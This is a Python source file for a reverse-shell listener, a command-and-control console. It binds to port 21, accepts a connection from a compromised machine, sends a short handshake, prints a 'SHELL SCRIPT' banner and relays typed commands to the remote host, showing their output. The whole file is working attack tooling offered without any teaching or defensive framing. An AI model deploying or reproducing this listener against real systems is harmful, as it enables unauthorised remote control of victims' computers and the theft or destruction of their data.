import socket
import time
import readline
def load_history():
    try:
        readline.read_history_file('history.txt')
    except FileNotFoundError:
        pass
def save_history():
    readline.write_history_file('history.txt')

def create_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
    s.bind(('0.0.0.0', 21))
    s.listen(1)
    print("WAITING...")
    return s

def accept_connection(s):
    tar, addr = s.accept()
    handshake(tar)
    res = tar.recv(1024)
    shell = tar.recv(1024)
    print(f'''
················································
: ███████╗██╗  ██╗███████╗██╗     ██╗          :
: ██╔════╝██║  ██║██╔════╝██║     ██║          :
: ███████╗███████║█████╗  ██║     ██║          :
: ╚════██║██╔══██║██╔══╝  ██║     ██║          :
: ███████║██║  ██║███████╗███████╗███████╗     :
: ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝     :
:                                              :
: ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗ :
: ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝ :
: ███████╗██║     ██████╔╝██║██████╔╝   ██║    :
: ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║    :
: ███████║╚██████╗██║  ██║██║██║        ██║    :
: ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝    :
················································

Connect  {addr}{res.decode()}''')
    return tar,shell.decode()
def handshake(tar):
    tar.send(b'tff')

def handle_client(tar,shell):
    cmd = ''
    line = 21
    while cmd != '/21':
        cmd = input(f'{shell}> ')
        if cmd!='':
            tar.send(cmd.encode())
            res = tar.recv(1024).decode()
            if res:
                print(f"{res}")
            else:
                print("No response received or connection lost.")
            cmd = ''
            line += len(res.splitlines()) + 2
            time.sleep(0.3)


def close_server(s, tar):
    tar.close()
    s.close()

def main():
    s = create_server()
    tar,shell = accept_connection(s)
    try:
        handle_client(tar,shell)

    except KeyboardInterrupt:
        print('\n[exited]')
    finally:
        close_server(s, tar)
main()
